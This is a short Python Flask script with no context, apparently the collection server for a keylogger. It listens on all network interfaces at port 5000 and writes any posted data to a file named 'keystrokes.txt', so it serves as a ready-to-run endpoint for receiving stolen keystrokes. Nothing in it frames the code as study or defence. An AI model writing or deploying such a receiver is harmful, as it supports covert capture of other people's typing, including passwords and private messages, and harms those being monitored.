from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.data.decode('utf-8')
    with open("keystrokes.txt", "w") as f:
        f.write(data)
    return "Received", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
